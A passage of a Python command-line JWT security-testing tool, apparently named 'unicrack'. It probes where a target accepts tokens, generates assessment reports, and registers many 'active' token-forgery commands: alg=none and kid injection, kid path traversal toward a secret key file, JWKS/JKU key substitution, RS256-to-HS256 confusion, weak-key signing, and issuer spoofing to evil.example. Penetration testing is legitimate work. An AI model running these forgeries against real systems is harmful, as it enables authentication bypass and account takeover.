        {"type": "header", "name": "JWT", "format": "{token}"},
        {"type": "header", "name": "Token", "format": "{token}"},
        {"type": "cookie", "name": "jwt", "format": "{token}"},
        {"type": "cookie", "name": "token", "format": "{token}"},
        {"type": "cookie", "name": "auth", "format": "{token}"},
        {"type": "cookie", "name": "session", "format": "{token}"},
        {"type": "cookie", "name": "accessToken", "format": "{token}"},
        {"type": "query", "name": "token", "format": "{token}"},
        {"type": "query", "name": "jwt", "format": "{token}"},
        {"type": "query", "name": "auth", "format": "{token}"},
        {"type": "query", "name": "access_token", "format": "{token}"},
        {"type": "body_json", "name": "token", "format": "{token}"},
        {"type": "body_json", "name": "accessToken", "format": "{token}"},
        {"type": "body_json", "name": "jwt", "format": "{token}"},
        {"type": "body_form", "name": "token", "format": "{token}"},
        {"type": "body_form", "name": "jwt", "format": "{token}"},
    ]
    
    results = []
    
    with Progress("[progress.description]{task.description}", BarColumn(),
                 TimeElapsedColumn(), console=console) as progress:
        task = progress.add_task("Testing token placements...", total=len(placements))
        
        for placement in placements:
            placement_type = placement["type"]
            name = placement["name"]
            token_value = placement["format"].format(token=token)
            
            headers = {}
            cookies = {}
            params = {}
            data = {}
            json_data = {}
            
            if placement_type == "header":
                headers[name] = token_value
            elif placement_type == "cookie":
                cookies[name] = token_value
            elif placement_type == "query":
                params[name] = token_value
            elif placement_type == "body_json":
                json_data[name] = token_value
            elif placement_type == "body_form":
                data[name] = token_value
            
            description = f"{placement_type} - {name}: {token_value[:15]}..."
            
            try:
                response = requests.request(
                    method=method,
                    url=url,
                    headers=headers,
                    cookies=cookies,
                    params=params,
                    data=data or None,
                    json=json_data or None,
                    timeout=10,
                    verify=False
                )
                
                status = "success" if response.status_code < 400 else "rejected"
                results.append({
                    "placement": placement,
                    "status": status,
                    "status_code": response.status_code,
                    "description": description
                })
                
                if status == "success":
                    progress.update(task, description=f"[green]FOUND: {description}[/green]")
                    current_session.add_finding(
                        title="Token Placement Found", 
                        description=f"JWT accepted in {placement_type} as {name}",
                        severity="Info",
                        token=token,
                        details={"placement_type": placement_type, "name": name, "status_code": response.status_code}
                    )
                else:
                    progress.update(task, description=f"Testing: {description}")
            except Exception as e:
                results.append({
                    "placement": placement,
                    "status": "error",
                    "error": str(e),
                    "description": description
                })
                progress.update(task, description=f"[red]ERROR: {description}[/red]")
            
            progress.update(task, advance=1)
    
    # Display results
    console.print("\n[bold]Token Placement Results:[/bold]")
    
    success_found = False
    for result in results:
        if result["status"] == "success":
            success_found = True
            placement = result["placement"]
            console.print(f"[bold green]ACCEPTED: {placement['type']} - {placement['name']}[/bold green]")
            console.print(f"  Status Code: {result['status_code']}")
    
    if not success_found:
        console.print("[yellow]No successful token placements found[/yellow]")
    
    # Save results to file
    results_str = json.dumps(results, indent=2)
    save_output_to_file(results_str, "token_placement_results", "json")

@app.command(help="Generate security assessment report")
def report(output_format: str = typer.Option("json", "--format", help="Output format: json, html, md"),
           output_file: bool = typer.Option(True, "--output-file/--no-output-file")):
    """
    Generate a comprehensive security report based on the current session findings
    """
    report_data = generate_report()
    
    if not report_data:
        return
    
    if output_format == "json":
        report_content = json.dumps(report_data, indent=2)
        if output_file:
            save_output_to_file(report_content, "security_report", "json")
    
    elif output_format == "html":
        # Generate a simple HTML report
        html_template = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT Security Assessment Report</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }
        h1 { color: #0066cc; border-bottom: 2px solid #0066cc; padding-bottom: 10px; }
        h2 { color: #0066cc; margin-top: 20px; }
        .summary { background-color: #f0f0f0; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .critical { color: #cc0000; }
        .high { color: #ff6600; }
        .medium { color: #ffcc00; }
        .low { color: #009900; }
        .finding { margin-bottom: 15px; padding: 10px; border-left: 4px solid #ccc; }
        .finding.critical { border-left-color: #cc0000; background-color: #fff0f0; }
        .finding.high { border-left-color: #ff6600; background-color: #fff6e6; }
        .finding.medium { border-left-color: #ffcc00; background-color: #fffbe6; }
        .finding.low { border-left-color: #009900; background-color: #f0fff0; }
        pre { background-color: #f5f5f5; padding: 10px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>JWT Security Assessment Report</h1>
    <p><strong>Date:</strong> {date}</p>
    <p><strong>Target:</strong> {target}</p>
    <p><strong>Session ID:</strong> {session_id}</p>
    
    <div class="summary">
        <h2>Summary</h2>
        <p><strong>Total Findings:</strong> {total_findings}</p>
        <p>
            <strong>Severity Breakdown:</strong><br>
            <span class="critical">Critical: {critical_count}</span><br>
            <span class="high">High: {high_count}</span><br>
            <span class="medium">Medium: {medium_count}</span><br>
            <span class="low">Low: {low_count}</span><br>
            Info: {info_count}
        </p>
        <p><strong>Tested Tokens:</strong> {tested_tokens}</p>
    </div>
    
    <h2>Findings</h2>
    {findings_html}
    
    <h2>Recommendations</h2>
    <ul>
        {recommendations_html}
    </ul>
</body>
</html>
"""
        
        # Build findings HTML
        findings_html = ""
        for f in report_data["findings"]:
            severity = f.get("severity", "Info")
            severity_class = severity.lower()
            
            details_html = ""
            if f.get("details"):
                details_html = "<pre>" + json.dumps(f["details"], indent=2) + "</pre>"
                
            findings_html += f"""
            <div class="finding {severity_class}">
                <h3>{f["title"]} <span class="{severity_class}">({severity})</span></h3>
                <p>{f["description"]}</p>
                {details_html}
                <p><strong>Timestamp:</strong> {f.get("timestamp", "")}</p>
            </div>
            """
        
        # Build recommendations HTML
        recommendations_html = ""
        for rec in report_data["recommendations"]:
            recommendations_html += f"<li>{rec}</li>"
        
        # Insert data into template
        html_content = html_template.format(
            date=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            target=report_data["target"],
            session_id=report_data["session_id"],
            total_findings=report_data["summary"]["total_findings"],
            critical_count=report_data["summary"]["severity_breakdown"]["Critical"],
            high_count=report_data["summary"]["severity_breakdown"]["High"],
            medium_count=report_data["summary"]["severity_breakdown"]["Medium"],
            low_count=report_data["summary"]["severity_breakdown"]["Low"],
            info_count=report_data["summary"]["severity_breakdown"]["Info"],
            tested_tokens=report_data["summary"]["tested_tokens"],
            findings_html=findings_html,
            recommendations_html=recommendations_html
        )
        
        if output_file:
            save_output_to_file(html_content, "security_report", "html")
    
    elif output_format == "md":
        # Generate a Markdown report
        md_content = f"""# JWT Security Assessment Report

**Date:** {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}  
**Target:** {report_data["target"]}  
**Session ID:** {report_data["session_id"]}

## Summary

- **Total Findings:** {report_data["summary"]["total_findings"]}
- **Severity Breakdown:**
  - Critical: {report_data["summary"]["severity_breakdown"]["Critical"]}
  - High: {report_data["summary"]["severity_breakdown"]["High"]}
  - Medium: {report_data["summary"]["severity_breakdown"]["Medium"]}
  - Low: {report_data["summary"]["severity_breakdown"]["Low"]}
  - Info: {report_data["summary"]["severity_breakdown"]["Info"]}
- **Tested Tokens:** {report_data["summary"]["tested_tokens"]}

## Findings

"""
        # Add findings
        for f in report_data["findings"]:
            md_content += f"""### {f["title"]} ({f.get("severity", "Info")})

{f["description"]}

"""
            if f.get("details"):
                md_content += "**Details:**\n\n```json\n" + json.dumps(f["details"], indent=2) + "\n```\n\n"
            
            md_content += f"**Timestamp:** {f.get('timestamp', '')}\n\n"
        
        # Add recommendations
        md_content += "## Recommendations\n\n"
        for rec in report_data["recommendations"]:
            md_content += f"- {rec}\n"
        
        if output_file:
            save_output_to_file(md_content, "security_report", "md")
    
    else:
        console.print(f"[red]Unsupported format: {output_format}[/red]")
        return
    
    console.print(f"[green]Report generated in {output_format} format[/green]")
    if output_file:
        console.print("[cyan]Report saved to file[/cyan]")

# ───────────────────────────  EXTRA CLI COMMANDS  ───────────────────────
opt = typer.Option  # shorthand

# older extra commands (kid … audbypass) ---------------------------------
@app.command(help="(active) Simple KID header injection (alg=none).")
def kid(token: str = opt(...,"-t","--token",callback=validate_token),
        kid: str = opt("evil","--kid"),
        active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_kid_inject(h,p,kid))

@app.command(help="(active) Directory-traversal via kid.")
def traversal(token: str = opt(...,"-t","--token",callback=validate_token),
              depth: int = opt(8,"--depth"),
              path: str = opt("keys/secret.pem","--file"),
              active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_kid_traversal(h,p,depth,path))

@app.command(help="(active) Full JWKS key-injection (oct/HS256).")
def jwkskey(token: str = opt(...,"-t","--token",callback=validate_token),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_jwks_key_inject(h,p))

@app.command(help="(active) Public-key substitution via JKU (advanced).")
def jkuadv(token: str = opt(...,"-t","--token",callback=validate_token),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    tok,priv,url=_jku_pubkey_sub(h,p)
    console.print(f"[green]Malicious JWKS at:[/green] {url}")
    console.print(f"[green]Private key:[/green]\n{priv}")
    console.print(f"[green]Forged token:[/green]\n{tok}")

@app.command(help="(active) Nested JWT attack.")
def nested(token: str = opt(...,"-t","--token",callback=validate_token),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_nested_jwt(h,p))

@app.command(help="(active) Nested JWT with alg=none downgrade.")
def nestednone(token: str = opt(...,"-t","--token",callback=validate_token),
               active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_nested_none_downgrade(h,p))

@app.command(help="(active) Generate weak RSA key & sign token.")
def weakkey(token: str = opt(...,"-t","--token",callback=validate_token),
            bits: int = opt(512,"--bits"),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    tok,priv=_weak_key(h,p,bits)
    console.print(f"[green]{bits}-bit private key:[/green]\n{priv}")
    console.print(f"[green]Signed token:[/green]\n{tok}")

@app.command(help="(active) JWK URL rewrite attack.")
def jwkrewrite(token: str = opt(...,"-t","--token",callback=validate_token),
               active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_jwk_url_rewrite(h,p))

@app.command(help="(active) RS256→HS256 key-confusion (offline).")
def confuseadv(token: str = opt(...,"-t","--token",callback=validate_token),
               active: bool = opt(False,"--active")):
    _need_active(active); forged=_key_confusion_adv(token)
    if forged: console.print(forged)

@app.command(help="(active) JWT bypass via incorrect audience.")
def audbypass(token: str = opt(...,"-t","--token",callback=validate_token),
              aud: str = opt("wrong_aud","--add"),
              active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token); console.print(_aud_bypass(h,p,aud))

# NEW commands -----------------------------------------------------------
@app.command(help="(active) Manipulate / duplicate the issuer claim.")
def issuer(token: str = opt(...,"-t","--token",callback=validate_token),
           new: str = opt("https://evil.example","--new"),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_issuer_manipulation(h,p,new))

@app.command(help="(active) Critical-claims confusion attack.")
def critconfuse(token: str = opt(...,"-t","--token",callback=validate_token),
                active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_crit_claims_confusion(h,p))

@app.command(help="(active) Typo-claims attack (expp/nbff/audd).")
def typoclaim(token: str = opt(...,"-t","--token",callback=validate_token),
              active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_typo_claims(h,p))

@app.command(help="(active) Signed-then-encrypted (JWS→JWE mix) POC.")
def jwemix(token: str = opt(...,"-t","--token",callback=validate_token),
           secret: str = opt("s3cret","--secret"),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_signed_then_encrypted(h,p,secret))

@app.command(help="(active) Manipulate nbf claim (past|future).")
def nbf(token: str = opt(...,"-t","--token",callback=validate_token),
        when: str = opt("past","--when",help="past|future"),
        active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_nbf_manipulation(h,p,when))

@app.command(help="(active) Replay attack – modify iat timestamp.")
def replay(token: str = opt(...,"-t","--token",callback=validate_token),
           shift: int = opt(-3600,"--shift",help="seconds to add to now"),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_replay_mod_ts(h,p,shift))

@app.command(help="(active) Confuse parser with typo in alg name.")
def algtypo(token: str = opt(...,"-t","--token",callback=validate_token),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_alg_typo_confusion(h,p))

@app.command(help="(active) zip=DEF compression confusion (no real deflate).")
def zipdef(token: str = opt(...,"-t","--token",callback=validate_token),
           active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_zip_def_confusion(h,p))

@app.command(help="(active) Mix-and-match nested JWE/JWS confusion.")
def nestmix(token: str = opt(...,"-t","--token",callback=validate_token),
            secret: str = opt("k","--secret"),
            active: bool = opt(False,"--active")):
    _need_active(active); h,p,_=parse_jwt(token)
    console.print(_nest_mix_confusion(h,p,secret))

# ─────────────────────────────── MAIN  ─────────────────────────────────
@app.callback()
def _root(ctx: typer.Context):
    if ctx.invoked_subcommand is None:
        show_banner()
        console.print(app.get_help())

if __name__ == "__main__":
    show_banner()
    # Initialize session for new run
    current_session = AttackSession()
    
    try:
        app()
    except KeyboardInterrupt:
        console.print("\n[yellow]Operation cancelled by user[/yellow]")
    except Exception as e:
        console.print(f"\n[bold red]Error:[/bold red] {e}")
        
        # Show detailed traceback in debug mode
        if os.environ.get("UNICRACK_DEBUG"):
            import traceback
            console.print(traceback.format_exc())
            
    # Before exit, show option to generate report if findings exist
    if current_session.findings and not os.environ.get("UNICRACK_NO_REPORT_PROMPT"):
        console.print()
        generate_report_prompt = typer.confirm("Generate security report from this session?")
        if generate_report_prompt:
            report_format = typer.prompt(
                "Report format (json/html/md)", 
                default="html",
                show_choices=True,
                type=typer.Choice(["json", "html", "md"])
            )
            report(output_format=report_format)
